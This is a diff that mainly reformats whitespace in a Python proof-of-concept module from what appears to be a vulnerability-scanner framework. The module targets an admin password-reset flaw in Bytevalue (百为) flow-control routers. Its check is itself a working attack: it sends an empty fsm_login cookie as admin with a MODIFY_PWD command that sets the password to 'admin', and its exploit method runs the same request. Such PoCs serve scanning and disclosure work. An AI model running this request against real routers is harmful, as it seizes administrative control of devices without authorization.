@@ -6,11 +6,12 @@ import urlparse
 import time
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Bytevalue_0001' # 平台漏洞编号，留空
+    vuln_id = 'Bytevalue_0001'  # 平台漏洞编号，留空
     name = '百为流控路由管理员密码重置'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2015-03-09'  # 漏洞公布时间
     desc = '''
         百为流控路由正常请求中包含fsm_login的值，为权限验证值。
@@ -22,6 +23,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '百为流控路由'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '2a2cef96-ca3b-490d-8578-f209ac48a7dd'
@@ -35,7 +37,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             """
             POC Name  :  百为流控路由管理员密码重置漏洞
             Author    :  a
@@ -47,9 +49,9 @@ class Poc(ABPoc):
             cookie = 'fsm_u=admin; fsm_login='
             data = 'cmd=MODIFY_PWD&json=%7B%22NewPwd%22%3A%22admin%22%7D'
             url = self.target + payload
-            code, head,res, errcode, _ = hh.http(url,data,cookie = cookie)
+            code, head, res, errcode, _ = hh.http(url, data, cookie=cookie)
 
-            if '{ "ret": 0 }' in res and code ==200:
+            if '{ "ret": 0 }' in res and code == 200:
                 #security_hole(arg + '  Has resetting password user:%s pass:%s' %('admin','admin'))
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -59,6 +61,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
